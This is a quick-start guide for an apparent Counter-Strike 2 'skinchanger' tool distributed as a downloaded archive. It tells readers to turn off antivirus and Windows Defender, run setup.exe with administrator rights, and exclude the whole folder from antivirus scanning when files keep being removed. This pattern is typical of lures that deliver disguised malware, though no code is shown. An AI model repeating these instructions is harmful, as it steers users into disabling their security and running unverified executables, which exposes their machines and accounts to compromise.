## 📦 **Quick Start: Setting Up the Tool**

Ready to unlock your dream CS2 inventory visually? Follow these steps to get everything running in minutes:

### Step 1: Download
Grab the latest **CS2 Skinchanger** archive from the link provided earlier.

### Step 2: Prepare Your System
- Temporarily disable antivirus / Windows Defender (most external tools get flagged — add exception after install if needed)
- Extract the .zip file to any convenient folder using WinRAR, 7-Zip or built-in extractor

### Step 3: Check & Install Java (Important!)
This tool requires **Java Runtime Environment** to run properly.

1. Open the extracted folder and try double-clicking **setup.exe** or **launcher.jar** / **Skinchanger.exe**
2. **If you see an error like**  
   - “Java is not installed”  
   - “Unable to locate Java Runtime Environment”  
   - “No Java virtual machine was found”  
   → you need to install Java.

3. **Install Java**:
   - Go to the official website: https://www.java.com/en/download/ or https://adoptium.net/ (recommended: Temurin 17 or 21 LTS)
   - Download the latest **Java Runtime Environment (JRE)** or **JDK** for your system (Windows 64-bit most common)
   - Run the installer → follow prompts (usually just “Next” → “Install”)
   - After installation, **restart your computer** (recommended) or at least close/reopen the tool folder

4. Retry launching **setup.exe** or the main .jar / .exe file — it should now start without Java errors.

### Step 4: Complete Installation
1. If prompted during setup, grant administrator rights
2. Follow on-screen instructions (may install additional runtimes like Visual C++ if missing — allow it)
3. Installation usually finishes in < 1 minute

### Step 5: Launch & Use In-Game
1. Start **Counter-Strike 2** (make sure Steam is running)
2. In the main menu or during a match, press **Insert** (or **F10** / **Home** — check your config/hotkey file if needed) to open the tool menu
3. Browse skins, knives, gloves, stickers → preview in real-time → apply and enjoy instantly!

### Step 6: Have Fun & Switch Anytime

---

### Troubleshooting (Quick Fixes)
- **Java still not detected after install** → Make sure you installed 64-bit version if your Windows is 64-bit  
  Run `java -version` in Command Prompt — should show version info
- **Tool crashes / doesn't open** → Run as Administrator, reinstall Java, update graphics drivers
- **Antivirus keeps deleting files** → Add the entire extracted folder to exclusions
- **No changes in-game** → Ensure CS2 window is focused, re-apply skins, or restart game + tool

Now you're all set — enjoy your fully customized CS2 look!
